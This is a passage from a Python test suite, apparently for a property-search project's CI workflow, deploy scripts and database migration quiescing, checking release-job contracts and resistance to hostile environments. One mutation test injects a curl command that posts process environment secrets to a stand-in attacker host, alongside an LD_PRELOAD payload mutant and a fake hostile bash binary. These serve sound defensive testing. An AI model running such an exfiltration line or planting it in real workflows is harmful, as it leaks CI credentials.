                "else\n"
                "  snapshot_status=\"$?\"\n"
                "fi\n"
                "[[ \"${snapshot_status}\" -eq 1 ]]\n"
                "cleanup_smoke_tmp_dir\n"
            ),
            "bash",
            str(root),
            mutation,
            str(displaced),
            str(replacement),
        ],
        cwd=ROOT,
        check=False,
        capture_output=True,
        text=True,
    )

    assert completed.returncode == 0
    assert completed.stdout == ""
    assert completed.stderr == (
        "property postgres smoke .env changed while it was snapshotted\n"
    )
    if mutation == "replace_name":
        assert env_path.read_text(encoding="utf-8") == "replacement=true\n"
        assert displaced.read_text(encoding="utf-8") == "original=true\n"
    else:
        assert env_path.read_text(encoding="utf-8") == (
            "original=true\nconcurrent=true\n"
        )
        assert not displaced.exists()
        assert replacement.read_text(encoding="utf-8") == "replacement=true\n"


@pytest.mark.parametrize("mutation", ("replace_name", "edit_in_place"))
def test_property_postgres_smoke_private_update_and_cleanup_never_touch_canonical_env(
    tmp_path: Path,
    mutation: str,
) -> None:
    source = _read("scripts/smoke_property_postgres.sh")
    create_function = _bash_function(source, "create_smoke_tmp_dir")
    validate_function = _bash_function(source, "smoke_tmp_is_exact")
    cleanup_tmp_function = _bash_function(source, "cleanup_smoke_tmp_dir")
    private_env_function = _bash_function(source, "smoke_env_is_exact")
    snapshot_function = _bash_function(source, "snapshot_smoke_env")
    set_function = _bash_function(source, "set_env_value")
    cleanup_function = _bash_function(source, "cleanup")
    root = tmp_path / "root"
    root.mkdir()
    env_path = root / ".env"
    env_path.write_text("original=true\nTARGET=old\n", encoding="utf-8")
    displaced = root / "displaced-original"
    cleanup_marker = tmp_path / "compose-cleanup"

    completed = subprocess.run(
        [
            "/bin/bash",
            "--noprofile",
            "--norc",
            "-eu",
            "-c",
            (
                f"{create_function}\n"
                f"{validate_function}\n"
                f"{cleanup_tmp_function}\n"
                f"{private_env_function}\n"
                f"{snapshot_function}\n"
                f"{set_function}\n"
                f"{cleanup_function}\n"
                "ROOT=\"$1\"\n"
                "MUTATION=\"$2\"\n"
                "DISPLACED=\"$3\"\n"
                "CLEANUP_MARKER=\"$4\"\n"
                "compose_stub() {\n"
                "  smoke_env_is_exact\n"
                "  printf 'private-env-present\\n' > \"${CLEANUP_MARKER}\"\n"
                "}\n"
                "DC=(compose_stub)\n"
                "compose_cleanup_armed=1\n"
                "smoke_tmp_dir=''\n"
                "smoke_tmp_identity=''\n"
                "smoke_env_file=''\n"
                "smoke_env_identity=''\n"
                "create_smoke_tmp_dir\n"
                "workspace=\"${smoke_tmp_dir}\"\n"
                "snapshot_smoke_env\n"
                "if [[ \"${MUTATION}\" == replace_name ]]; then\n"
                "  /usr/bin/mv -T -- \"${ROOT}/.env\" \"${DISPLACED}\"\n"
                "  printf 'replacement=true\\n' > \"${ROOT}/.env\"\n"
                "else\n"
                "  printf 'before-update=true\\n' >> \"${ROOT}/.env\"\n"
                "fi\n"
                "set_env_value TARGET private-only\n"
                "grep -Fx 'TARGET=private-only' \"${smoke_env_file}\"\n"
                "printf 'before-cleanup=true\\n' >> \"${ROOT}/.env\"\n"
                "cleanup\n"
                "[[ ! -e \"${workspace}\" && ! -L \"${workspace}\" ]]\n"
            ),
            "bash",
            str(root),
            mutation,
            str(displaced),
            str(cleanup_marker),
        ],
        cwd=ROOT,
        check=False,
        capture_output=True,
        text=True,
    )

    assert completed.returncode == 0, completed.stderr
    assert completed.stdout == "TARGET=private-only\n"
    assert completed.stderr == ""
    assert cleanup_marker.read_text(encoding="utf-8") == "private-env-present\n"
    if mutation == "replace_name":
        assert env_path.read_text(encoding="utf-8") == (
            "replacement=true\nbefore-cleanup=true\n"
        )
        assert displaced.read_text(encoding="utf-8") == (
            "original=true\nTARGET=old\n"
        )
    else:
        assert env_path.read_text(encoding="utf-8") == (
            "original=true\n"
            "TARGET=old\n"
            "before-update=true\n"
            "before-cleanup=true\n"
        )
        assert not displaced.exists()


def test_smoke_runtime_bootstraps_clean_runner_dependencies_and_release_parent() -> None:
    workflow = _read(".github/workflows/smoke-runtime.yml")
    security_job = _workflow_job(workflow, "security-static")
    api_job = _workflow_job(workflow, "smoke-runtime-api")
    browser_job = _workflow_job(workflow, "propertyquarry-browser-contracts")
    postgres_smoke_job = _workflow_job(workflow, "smoke-runtime-postgres")
    postgres_contract_job = _workflow_job(workflow, "postgres-runtime-contracts")

    assert "fetch-depth: 0" in security_job
    assert "Release hygiene audits every commit between the manifest candidate and HEAD." in security_job
    assert "pytest==9.0.2" in api_job
    assert "httpx==0.28.1" in api_job
    assert "opencv-python-headless==4.13.0.92" in api_job
    assert "sudo apt-get install --yes ffmpeg" in api_job
    assert "python -m playwright install --with-deps chromium" in api_job
    assert "pytest==9.0.2" in browser_job
    assert "httpx==0.28.1" in browser_job
    assert "sudo apt-get install --yes ffmpeg" in browser_job
    assert "POSTGRES_PASSWORD: propertyquarry-ci-${{ github.run_id }}" in postgres_smoke_job
    assert "docker volume create property_propertyquarry_public_tours" in postgres_smoke_job
    assert "POSTGRES_PASSWORD: propertyquarry-ci-${{ github.run_id }}" in postgres_contract_job
    assert "pytest==9.0.2" in postgres_contract_job
    assert "httpx==0.28.1" in postgres_contract_job


def test_smoke_runtime_pins_external_actions_to_immutable_commits() -> None:
    workflow = _read(".github/workflows/smoke-runtime.yml")
    action_uses_lines = [
        line.strip()
        for line in workflow.splitlines()
        if re.match(r"^\s*(?:-\s+)?uses:\s+", line)
    ]

    assert action_uses_lines

    def assert_immutable_action(declaration: str) -> None:
        action_declaration, _, version_comment = declaration.partition("#")
        action_ref = action_declaration.split("uses:", 1)[1].strip().strip("'\"")
        if action_ref.startswith("./"):
            return

        assert re.fullmatch(
            r"[A-Za-z0-9_.-]+(?:/[A-Za-z0-9_.-]+)+@[0-9a-f]{40}",
            action_ref,
        ), f"external action must use an immutable 40-hex commit SHA: {action_ref}"
        assert re.fullmatch(
            r"v[1-9][0-9]*",
            version_comment.strip(),
        ), f"pinned external action must retain its major version comment: {declaration}"

    for action_uses_line in action_uses_lines:
        assert_immutable_action(action_uses_line)

    assert_immutable_action("uses: ./.github/actions/local-contract")


def test_legacy_compose_forwards_postgres_password_into_database_container() -> None:
    compose = _read("docker-compose.yml")

    assert 'POSTGRES_PASSWORD: "${POSTGRES_PASSWORD:-}"' in compose


def test_smoke_runtime_uses_only_the_fixed_v2_supervisor_for_release() -> None:
    workflow = _read(".github/workflows/smoke-runtime.yml")
    _assert_exact_v2_release_job(workflow)
    release_job = _workflow_job(workflow, "propertyquarry-release-v2")
    legacy_live_job = _workflow_job(workflow, "propertyquarry-live-release-gates")

    assert workflow.count("\n  propertyquarry-release-v2:\n") == 1
    assert (
        "if: ${{ github.event_name == 'workflow_dispatch' && github.ref == 'refs/heads/main' "
        "&& inputs.run_launch_authority == true "
        "&& needs['propertyquarry-ordinary-ci-success'].result == 'success' }}"
        in release_job
    )
    assert "timeout-minutes: 180" in release_job
    assert "group: propertyquarry-release-lifecycle-v2" in release_job
    assert "cancel-in-progress: false" in release_job
    assert "environment:\n      name: propertyquarry-production" in release_job
    assert "permissions:\n      contents: none\n      id-token: write" in release_job
    assert "runs-on: [self-hosted, propertyquarry-release-controller-v2]" in release_job
    assert (
        "shell: /bin/bash --noprofile --norc -p -euo pipefail {0}"
        in release_job
    )
    assert release_job.count(RELEASE_SUPERVISOR) == 2
    assert release_job.count("exec /usr/bin/env -i") == 2
    assert release_job.count("PATH=/usr/sbin:/usr/bin:/sbin:/bin") == 2
    assert release_job.count("HOME=/nonexistent") == 2
    assert release_job.count("LANG=C") == 2
    assert release_job.count("LC_ALL=C") == 2
    assert release_job.count("      - name:") == 2
    assert release_job.index("release-preflight") < release_job.index("release-run")
    assert release_job.count("ACTIONS_ID_TOKEN_REQUEST_URL") == 4
    assert release_job.count(
        'exec 9<<<"${ACTIONS_ID_TOKEN_REQUEST_TOKEN:?missing GitHub OIDC bearer}"'
    ) == 2
    assert release_job.count("unset ACTIONS_ID_TOKEN_REQUEST_TOKEN") == 2
    assert release_job.count("PROPERTYQUARRY_OIDC_TOKEN_FD=9") == 2
    assert (
        'ACTIONS_ID_TOKEN_REQUEST_TOKEN="${ACTIONS_ID_TOKEN_REQUEST_TOKEN}"'
        not in release_job
    )
    for identity in (
        "GITHUB_REPOSITORY",
        "GITHUB_REF",
        "GITHUB_SHA",
        "GITHUB_WORKFLOW_REF",
        "GITHUB_WORKFLOW_SHA",
        "GITHUB_RUN_ID",
        "GITHUB_RUN_ATTEMPT",
        "GITHUB_JOB",
    ):
        assert release_job.count(identity) == 4
    for forbidden in (
        "uses:",
        "actions/",
        "secrets.",
        "vars.",
        "checkout",
        "setup-python",
        "setup-node",
        "download-artifact",
        "upload-artifact",
        "cache",
        "pip install",
        "npm install",
        "python ",
        "bash scripts/",
        "docker",
        "DATABASE_URL",
        "TEABLE_",
        "RYBBIT_",
        "TELEGRAM_",
        "PROPERTYQUARRY_RELEASE_CONTROLLER_BUNDLE_PATH",
        "GITHUB_WORKSPACE",
        "GITHUB_TOKEN",
        "_completion/",
        "continue-on-error:",
        "if: ${{ always() }}",
        "|| true",
    ):
        assert forbidden not in release_job
    assert "if: ${{ false }}" in legacy_live_job


def test_v2_release_job_closed_yaml_contract_rejects_execution_indirection() -> None:
    workflow = _read(".github/workflows/smoke-runtime.yml")
    start = workflow.index("  propertyquarry-release-v2:\n")
    end = workflow.index("  # Legacy candidate-executed production jobs", start)
    before, body, after = workflow[:start], workflow[start:end], workflow[end:]

    injected_command = body.replace(
        "        run: |\n"
        '          exec 9<<<"${ACTIONS_ID_TOKEN_REQUEST_TOKEN:?missing GitHub OIDC bearer}"',
        "        run: |\n"
        "          /usr/bin/curl --silent --data-binary @/proc/self/environ "
        "https://attacker.invalid/collect\n"
        '          exec 9<<<"${ACTIONS_ID_TOKEN_REQUEST_TOKEN:?missing GitHub OIDC bearer}"',
        1,
    )
    job_environment = body.replace(
        "    needs:\n",
        "    env:\n      LD_PRELOAD: /candidate/payload.so\n    needs:\n",
        1,
    )
    duplicate_key = body.replace(
        "    timeout-minutes: 180\n",
        "    timeout-minutes: 180\n    timeout-minutes: 1\n",
        1,
    )
    custom_tag = body.replace(
        "    timeout-minutes: 180\n",
        "    timeout-minutes: !candidate-controlled 180\n",
        1,
    )
    alias = body.replace(
        "    environment:\n",
        "    environment: &production-environment\n",
        1,
    ).replace(
        "    permissions:\n",
        "    copied-environment: *production-environment\n    permissions:\n",
        1,
    )
    extra_step = body + (
        "      - name: Candidate-controlled extra command\n"
        "        shell: /bin/bash {0}\n"
        "        run: /usr/bin/id\n\n"
    )
    missing_fd_handoff = body.replace(
        '          exec 9<<<"${ACTIONS_ID_TOKEN_REQUEST_TOKEN:?missing GitHub OIDC bearer}"\n',
        "",
        1,
    )
    missing_bearer_unset = body.replace(
        "          unset ACTIONS_ID_TOKEN_REQUEST_TOKEN\n",
        "",
        1,
    )
    wrong_fd_contract = body.replace(
        "            PROPERTYQUARRY_OIDC_TOKEN_FD=9 \\\n",
        "            PROPERTYQUARRY_OIDC_TOKEN_FD=8 \\\n",
        1,
    )
    bearer_in_env_argv = body.replace(
        "            PROPERTYQUARRY_OIDC_TOKEN_FD=9 \\\n",
        "            PROPERTYQUARRY_OIDC_TOKEN_FD=9 \\\n"
        '            ACTIONS_ID_TOKEN_REQUEST_TOKEN="${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" \\\n',
        1,
    )

    for mutant_body in (
        injected_command,
        job_environment,
        duplicate_key,
        custom_tag,
        alias,
        extra_step,
        missing_fd_handoff,
        missing_bearer_unset,
        wrong_fd_contract,
        bearer_in_env_argv,
    ):
        with pytest.raises((AssertionError, yaml.YAMLError)):
            _assert_exact_v2_release_job(before + mutant_body + after)

    competing_controller_job = workflow + (
        "\n  candidate-controller-sidecar:\n"
        "    runs-on: [self-hosted, propertyquarry-release-controller-v2]\n"
        "    permissions:\n"
        "      id-token: write\n"
        "    steps:\n"
        "      - run: /usr/bin/env\n"
    )
    with pytest.raises(AssertionError):
        _assert_exact_v2_release_job(competing_controller_job)

    expression_controller_job = workflow + (
        "\n  candidate-controller-expression:\n"
        "    runs-on: ${{ 'propertyquarry-release-controller-v2' }}\n"
        "    steps:\n"
        "      - run: /usr/bin/id\n"
    )
    with pytest.raises(AssertionError):
        _assert_exact_v2_release_job(expression_controller_job)


def test_smoke_runtime_routes_release_from_ordinary_ci_to_one_atomic_v2_lane() -> None:
    workflow = _read(".github/workflows/smoke-runtime.yml")
    document = _strict_workflow_document(workflow)
    jobs = document["jobs"]
    aggregate_job = _workflow_job(workflow, "propertyquarry-ordinary-ci-success")
    release_job = _workflow_job(workflow, "propertyquarry-release-v2")

    required_jobs = (
        "property-security-posture",
        "security-static",
        "smoke-runtime-api",
        "propertyquarry-browser-contracts",
        "product-browser-e2e",
        "propertyquarry-postgres-browser-e2e",
        "propertyquarry-continuous-ux",
        "propertyquarry-accessibility-contracts",
        "propertyquarry-failure-state-contracts",
        "propertyquarry-activation-contracts",
        "smoke-runtime-postgres",
        "postgres-runtime-contracts",
    )
    assert type(jobs["propertyquarry-ordinary-ci-success"]) is dict
    assert jobs["propertyquarry-ordinary-ci-success"]["needs"] == list(required_jobs)
    assert jobs["propertyquarry-ordinary-ci-success"]["if"] == "${{ always() }}"
    for required_job in required_jobs:
        assert f"      - {required_job}\n" in aggregate_job
    assert "if: ${{ always() }}" in aggregate_job
    assert "details.get(\"result\") != \"success\"" in aggregate_job
    assert "secrets." not in aggregate_job
    assert "      - propertyquarry-ordinary-ci-success\n" in release_job
    assert "propertyquarry-flagship-security" not in release_job
    for legacy_job_name in (
        "propertyquarry-flagship-security",
        "propertyquarry-live-release-gates",
        "propertyquarry-live-activation-to-value",
        "propertyquarry-launch-controller-preflight",
        "propertyquarry-launch-gold",
    ):
        legacy_job = _workflow_job(workflow, legacy_job_name)
        assert "if: ${{ false }}" in legacy_job
        assert jobs[legacy_job_name]["if"] == "${{ false }}"
        assert legacy_job_name not in release_job
    assert "run_activation_journey" not in release_job
    assert "activation_run_key" not in release_job
    assert "release-preflight" in release_job
    assert "release-run" in release_job
    assert "reconcile-run" not in release_job


def test_smoke_runtime_v2_lane_is_fail_closed_without_installed_authority() -> None:
    workflow = _read(".github/workflows/smoke-runtime.yml")
    release_job = _workflow_job(workflow, "propertyquarry-release-v2")
    legacy_preflight = _workflow_job(
        workflow, "propertyquarry-launch-controller-preflight"
    )
    legacy_gold = _workflow_job(workflow, "propertyquarry-launch-gold")

    assert "run_launch_authority:" in workflow
    assert (
        "type: boolean"
        in workflow.split("run_launch_authority:", 1)[1].split("jobs:", 1)[0]
    )
    assert "inputs.run_launch_authority == true" in release_job
    assert "/usr/libexec/propertyquarry-release-control/" in release_job
    assert "propertyquarry-release-supervisor-v2" in release_job
    assert "PROPERTYQUARRY_RELEASE_CONTROLLER_READY" not in release_job
    assert "PROPERTYQUARRY_RELEASE_CONTROLLER_BUNDLE_SHA256" not in release_job
    assert "PROPERTYQUARRY_RELEASE_CONTROLLER_BUNDLE_PATH" not in release_job
    assert "--activate-snapshot" not in release_job
    assert "--restore-activation" not in release_job
    assert "scripts/propertyquarry_launch_authority.py" not in release_job
    assert "bash scripts/property_release_gates.sh" not in release_job
    assert "if: ${{ false }}" in legacy_preflight
    assert "if: ${{ false }}" in legacy_gold


def test_property_web_image_contains_the_canonical_release_manifest() -> None:
    dockerfile = _read("ea/Dockerfile.property-web")

    assert (
        "COPY docs/PROPERTYQUARRY_RELEASE_MANIFEST.md "
        "/app/docs/PROPERTYQUARRY_RELEASE_MANIFEST.md"
    ) in dockerfile


def test_protected_live_release_gate_is_remote_only_and_fail_closed() -> None:
    script = _read("scripts/propertyquarry_live_release_gates.sh")

    assert "PROPERTYQUARRY_LIVE_MOBILE_BASE_URL" in script
    assert "PROPERTYQUARRY_LIVE_RESEARCH_DETAIL_ROUTE" in script
    assert "PROPERTYQUARRY_LIVE_PRINCIPAL_ID" in script
    assert "PROPERTYQUARRY_LIVE_TELEGRAM_BOT_TOKEN" in script
    assert "PROPERTYQUARRY_LIVE_TELEGRAM_CHAT_ID" in script
    assert "EA_API_TOKEN" in script
    assert "--require-research-detail" in script
    assert "propertyquarry_live_mobile_surface_smoke.py" in script
    assert "propertyquarry_map_preview_flagship_gate.py" in script
    assert "propertyquarry_live_public_smoke.py" in script
    assert "propertyquarry_live_authenticated_smoke.py" in script
    assert "propertyquarry_live_telegram_delivery.py" in script
    assert "property-live-notification-delivery.json" in script
    assert "propertyquarry_live_release_provenance.py" in script
    assert script.index("propertyquarry_live_release_provenance.py") < script.index(
        "propertyquarry_live_mobile_surface_smoke.py"
    )
    assert "PROPERTYQUARRY_EXPECTED_RELEASE_COMMIT_SHA" in script
    assert "--no-canonical-fallback" in script
    assert "--seed-research-detail-fixture" not in script
    assert "--api-token" not in script
    assert "docker" not in script
    assert "compose" not in script
    assert "POSTGRES_PASSWORD" not in script
    assert "ensure_propertyquarry_render_bridge_runtime.py" not in script
    assert "--stage-only" in script
    assert "--activate-snapshot" not in script
    assert "PROPERTYQUARRY_EXPECTED_TEABLE_ORIGIN" in script
    assert "PROPERTYQUARRY_EXPECTED_TEABLE_BASE_ID_SHA256" in script
    assert 'expected_phase="staged"' in script
    for required_option in (
        "--expected-repository",
        "--expected-public-origin",
        "--expected-branch",
        "--expected-commit-sha",
        "--expected-deployment-id",
        "--expected-artifact-set",
        "--expected-release-label",
        "--expected-release-generated-at",
        "--expected-image-digest",
        "--expected-replica-id",
        "--expected-web-image",
        "--expected-render-image",
        "--security-receipt",
        "--security-workflow-binding",
        "--expected-workflow-head-sha",
        "--expected-workflow-run-id",
        "--expected-workflow-run-attempt",
    ):
        assert required_option in script

    release_bundle = _read("scripts/property_release_gates.sh")
    assert "/bin/bash -p scripts/propertyquarry_live_release_gates.sh" in release_bundle
    assert (
        'PYTHON_BIN="${PYTHON_BIN}" bash scripts/propertyquarry_live_release_gates.sh'
        not in release_bundle
    )


def test_propertyquarry_deploy_missing_live_provenance_forces_targeted_e2e() -> None:
    script = _read("scripts/deploy_propertyquarry.sh")
    _assert_external_deploy_controller_handoff(script)
    assert "--require-controller-self-attestation" in script
    assert "--require-external-monotonic-cas" in script
    assert "git rev-parse" not in script


def test_propertyquarry_deploy_fails_closed_on_dirty_release_provenance() -> None:
    script = _read("scripts/deploy_propertyquarry.sh")
    _assert_external_deploy_controller_handoff(script)
    assert script.index("--controller-owns-all-privileged-actions") < script.index(
        "--contain-before-candidate-validation"
    )
    assert "git status" not in script


def test_propertyquarry_docker_context_excludes_ignored_secret_and_runtime_files() -> None:
    dockerignore = set(_read(".dockerignore").splitlines())

    assert {
        ".env",
        ".env.*",
        "**/.env",
        "**/.env.*",
        "*.pem",
        "**/*.pem",
        "*.key",
        "**/*.key",
        "*.ovpn",
        "**/*.ovpn",
        "attachments/",
        "daemon-gogcli-config/",
        "data-*/",
        "memorial_data/",
        "config/*.local.yml",
        "config/onemin_api_keys.local.json",
        "config/onemin_slot_owners.local.json",
        "*.py[cod]",
        "**/*.py[cod]",
    } <= dockerignore


def test_property_runtime_image_copies_reconstruction_playwright_dependency() -> None:
    dockerfile = _read("ea/Dockerfile.property")
    runtime_copy = (
        "COPY scripts/propertyquarry_playwright_runtime.py "
        "/app/scripts/propertyquarry_playwright_runtime.py"
    )
    generator_copy = (
        "COPY scripts/generate_property_reconstruction.py "
        "/app/scripts/generate_property_reconstruction.py"
    )

    assert dockerfile.count(runtime_copy) == 1
    assert dockerfile.count(generator_copy) == 1
    assert dockerfile.index(runtime_copy) < dockerfile.index(generator_copy)
    assert dockerfile.index(generator_copy) < dockerfile.index("COPY ea/app /app/app")


def test_propertyquarry_deploy_wrapper_preflights_prod_and_probes_runtime(
    tmp_path: Path,
) -> None:
    script = _read("scripts/deploy_propertyquarry.sh")

    _assert_external_deploy_controller_handoff(script)
    assert 'operation="${operation%-run}-preflight"' in script
    assert "--read-only" in script
    assert "--forbid-containment" in script
    assert "--forbid-state-mutation" in script
    assert "--require-explicit-preflight-disposition" in script
    assert "propertyquarry-deploy-preflight-request.json" in script
    assert "propertyquarry-deploy-run-request.json" in script
    assert "A preflight request cannot" in script
    assert "must never be reused for a deploy run" in script
    assert "PROPERTYQUARRY_DEPLOY_PYTHON_BIN" not in script
    assert "docker compose" not in script

    marker = tmp_path / "hostile-startup-executed"
    hostile_bin = tmp_path / "hostile-bin"
    hostile_bin.mkdir()
    fake = hostile_bin / "bash"
    fake.write_text(
        f"#!/bin/sh\nprintf '%s\\n' hostile >> '{marker}'\nexit 97\n",
        encoding="utf-8",
    )
    fake.chmod(0o755)
    for name in ("dirname", "pwd", "env"):
        (hostile_bin / name).write_bytes(fake.read_bytes())
        (hostile_bin / name).chmod(0o755)
    bash_env = tmp_path / "BASH_ENV"
    bash_env.write_text(
        f"builtin printf '%s\\n' BASH_ENV >> '{marker}'\n",
        encoding="utf-8",
    )
    completed = subprocess.run(
        [str(ROOT / "scripts" / "deploy_propertyquarry.sh"), "--help"],
        cwd=ROOT,
        env={"PATH": str(hostile_bin), "BASH_ENV": str(bash_env), "ENV": str(bash_env)},
        check=False,
        capture_output=True,
        text=True,
    )
    assert completed.returncode == 0, completed.stderr
    assert "Usage:" in completed.stdout
    assert not marker.exists()

def test_propertyquarry_schema_migration_quiesces_existing_writers_before_commit(
    tmp_path: Path,
) -> None:
    completed, events = _run_schema_quiesce_scenario(
        tmp_path,
        scenario="success",
        api_state="running",
        worker_state="running",
        scheduler_state="running",
    )

    assert completed.returncode == 0, completed.stderr
    assert events == [
        "compose stop --timeout 30 api worker scheduler render",
        "migration-completed",
        "candidate-api-ready",
        "candidate-worker-ready",
        "candidate-scheduler-ready",
    ]


@pytest.mark.parametrize(
    ("sent_signal", "expected_status"),
    (
        (signal.SIGHUP, 129),
        (signal.SIGINT, 130),
        (signal.SIGTERM, 143),
    ),
)
def test_propertyquarry_schema_recovery_ignores_repeated_signal(
    tmp_path: Path,
    sent_signal: signal.Signals,
    expected_status: int,
) -> None:
    recovery_started = tmp_path / "recovery-started"
    traps_ready = tmp_path / "traps-ready"
    shell = r'''
set -euo pipefail

source "${QUIESCE_HELPER}"
PROPERTYQUARRY_SCHEMA_QUIESCE_ARMED=1
PROPERTYQUARRY_SCHEMA_MIGRATION_COMMITTED=0
PROPERTYQUARRY_PUBLIC_INGRESS_HOLD_ARMED=0

propertyquarry_restore_pre_migration_schema_writers() {
  printf 'entered\n'
  : > "${RECOVERY_STARTED}"
  /usr/bin/sleep 0.25
  printf 'finished\n'
}

propertyquarry_install_schema_quiesce_traps
: > "${TRAPS_READY}"
while :; do
  :
done
'''
    process = subprocess.Popen(
        ["/bin/bash", "--noprofile", "--norc", "-c", shell],
        cwd=ROOT,
        env={
            **os.environ,
            "QUIESCE_HELPER": str(
                ROOT / "scripts/propertyquarry_deploy_quiesce.sh"
            ),
            "RECOVERY_STARTED": str(recovery_started),
            "TRAPS_READY": str(traps_ready),
        },
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
        start_new_session=True,
    )
    deadline = time.monotonic() + 3
    while not traps_ready.exists() and process.poll() is None:
        if time.monotonic() >= deadline:
            process.kill()
            raise AssertionError("schema quiesce traps were not installed")
        time.sleep(0.01)
    os.killpg(process.pid, sent_signal)
    while not recovery_started.exists() and process.poll() is None:
        if time.monotonic() >= deadline:
            process.kill()
            raise AssertionError("schema recovery did not begin")
        time.sleep(0.01)
    os.killpg(process.pid, sent_signal)
    stdout, stderr = process.communicate(timeout=5)

    assert process.returncode == expected_status
    assert stdout == "entered\nfinished\n"
    assert stderr == ""


def test_propertyquarry_schema_migration_failure_aborts_migrator_then_restores_prior_runtime(
    tmp_path: Path,
) -> None:
    completed, events = _run_schema_quiesce_scenario(
        tmp_path,
        scenario="precommit-failure",
        api_state="running",
        worker_state="running",
        scheduler_state="stopped",
    )

    assert completed.returncode != 0
    assert events == [
        "compose stop --timeout 30 api worker scheduler render",
        "migration-failed",
        "compose stop --timeout 30 migrate",
        "compose start api",
        "compose start worker",
    ]
    assert "restoring only API, worker, scheduler, and render containers that were running before quiesce" in completed.stderr


def test_propertyquarry_crash_reconciliation_contains_worker_and_migrator(
    tmp_path: Path,
) -> None:
    event_log = tmp_path / "crash-reconcile-events.log"
    shell = r'''
set -euo pipefail

declare -A SERVICE_STATE=(
  [ingress]="running"
  [api]="running"
  [worker]="running"
  [scheduler]="running"
  [render]="running"
  [migrate]="running"
)

fake_compose() {
  local action="$1"
  local skip_next=0
  local arg=""
  local service=""
  shift
  if [[ "${action}" == "ps" ]]; then
    for arg in "$@"; do service="${arg}"; done
    [[ "${SERVICE_STATE[${service}]:-missing}" == "missing" ]] || printf 'cid-%s' "${service}"
    return 0
  fi
  [[ "${action}" == "stop" ]] || return 2
  printf 'compose stop %s\n' "$*" >> "${EVENT_LOG}"
  for arg in "$@"; do
    if [[ "${skip_next}" == "1" ]]; then skip_next=0; continue; fi
    if [[ "${arg}" == "--timeout" ]]; then skip_next=1; continue; fi
    SERVICE_STATE["${arg}"]="stopped"
  done
}

container_state_line() {
  local service="${1#cid-}"
  if [[ "${SERVICE_STATE[${service}]}" == "running" ]]; then
    printf 'running|healthy'
  else
    printf 'exited|none'
  fi
}

database_writer_inventory_lines() {
  local service=""
  for service in api worker scheduler migrate; do
    if [[ "${SERVICE_STATE[${service}]}" == "running" ]]; then
      printf 'cid-%s|%s\n' "${service}" "${service}"
    fi
  done
}

database_writer_session_inventory_lines() { return 0; }
stop_database_writer_container() { return 0; }
database_writer_container_is_active() { return 1; }

DC=(fake_compose)
source "${QUIESCE_HELPER}"
PROPERTYQUARRY_ALLOWED_DATABASE_WRITER_CONTAINER_NAMES=(api worker scheduler migrate)
propertyquarry_register_public_ingress_hold ingress ingress
propertyquarry_reconcile_incomplete_deploy_runtime \
  api api worker worker scheduler scheduler render render migrate migrate 30
propertyquarry_complete_crash_reconciliation
'''
    completed = subprocess.run(
        ["bash", "-c", shell],
        cwd=ROOT,
        env={
            **os.environ,
            "QUIESCE_HELPER": str(ROOT / "scripts/propertyquarry_deploy_quiesce.sh"),
            "EVENT_LOG": str(event_log),
        },
        text=True,
        capture_output=True,
        check=False,
    )

    assert completed.returncode == 0, completed.stderr
    assert event_log.read_text(encoding="utf-8").splitlines() == [
        "compose stop --timeout 30 ingress",
        "compose stop --timeout 30 api worker scheduler render migrate",
    ]


def test_propertyquarry_candidate_resolution_never_claims_live_default_containers(
    tmp_path: Path,
) -> None:
    event_log = tmp_path / "global-docker-events.log"
    shell = r'''
set -euo pipefail

candidate_compose() {
  if [[ "$1" == "ps" ]]; then
    return 0
  fi
  return 2
}

docker() {
  printf 'global-docker %s\n' "$*" >> "${EVENT_LOG}"
  case "$*" in
    *propertyquarry-api*) printf 'cid-live-default-api' ;;
    *propertyquarry-worker*) printf 'cid-live-default-worker' ;;
    *propertyquarry-scheduler*) printf 'cid-live-default-scheduler' ;;
  esac
}

container_state_line() {
  printf 'running|healthy'
}

DC=(candidate_compose)
source "${QUIESCE_HELPER}"
api_cid="$(container_id_for_service propertyquarry-api propertyquarry-api)"
worker_cid="$(container_id_for_service propertyquarry-worker propertyquarry-worker)"
scheduler_cid="$(container_id_for_service propertyquarry-scheduler propertyquarry-scheduler)"
[[ -z "${api_cid}" ]]
[[ -z "${worker_cid}" ]]
[[ -z "${scheduler_cid}" ]]
'''
    completed = subprocess.run(
        ["bash", "-c", shell],
        cwd=ROOT,
        env={
            **os.environ,
            "QUIESCE_HELPER": str(ROOT / "scripts/propertyquarry_deploy_quiesce.sh"),
            "EVENT_LOG": str(event_log),
        },
        text=True,
        capture_output=True,
        check=False,
    )

    assert completed.returncode == 0, completed.stderr
    assert not event_log.exists()


def test_propertyquarry_paused_writer_does_not_satisfy_quiesce_assertion(
    tmp_path: Path,
) -> None:
    completed, events = _run_schema_quiesce_scenario(
        tmp_path,
        scenario="paused-writer-stuck",
        api_state="paused",
        worker_state="running",
        scheduler_state="running",
    )

    assert completed.returncode != 0
    assert events == [
        "compose stop --timeout 30 api worker scheduler render",
        "compose start worker",
        "compose start scheduler",
    ]
    assert "api container cid-api is still active" in completed.stderr
    assert "recovery will not activate a prior non-running writer" in completed.stderr


def test_propertyquarry_paused_migrator_is_aborted_before_writer_restoration(
    tmp_path: Path,
) -> None:
    completed, events = _run_schema_quiesce_scenario(
        tmp_path,
        scenario="paused-migrator-failure",
        api_state="running",
        worker_state="running",
        scheduler_state="stopped",
    )

    assert completed.returncode != 0
    assert events == [
        "compose stop --timeout 30 api worker scheduler render",
        "migration-failed",
        "compose stop --timeout 30 migrate",
        "compose start api",
        "compose start worker",
    ]
    assert events.index("compose stop --timeout 30 migrate") < events.index("compose start api")


def test_propertyquarry_quiesce_treats_every_nonterminal_container_state_as_active() -> None:
    shell = r'''
set -euo pipefail

container_state_line() {
  printf '%s|none' "${1#cid-}"
}

DC=(false)
source "${QUIESCE_HELPER}"
for status in created running paused restarting removing unknown; do
  propertyquarry_schema_container_is_active "cid-${status}"
done
for status in exited dead; do
  if propertyquarry_schema_container_is_active "cid-${status}"; then
    exit 1
  fi
done
'''
    completed = subprocess.run(
        ["bash", "-c", shell],
        cwd=ROOT,
        env={
            **os.environ,
            "QUIESCE_HELPER": str(ROOT / "scripts/propertyquarry_deploy_quiesce.sh"),
        },
        text=True,
        capture_output=True,
        check=False,
    )

    assert completed.returncode == 0, completed.stderr


def test_propertyquarry_partial_quiesce_failure_restores_the_complete_prior_runtime(
    tmp_path: Path,
) -> None:
    completed, events = _run_schema_quiesce_scenario(
        tmp_path,
        scenario="quiesce-failure",
        api_state="running",
        worker_state="running",
        scheduler_state="running",
    )

    assert completed.returncode != 0
    assert events == [
        "compose stop --timeout 30 api worker scheduler render",
        "compose start api",
        "compose start worker",
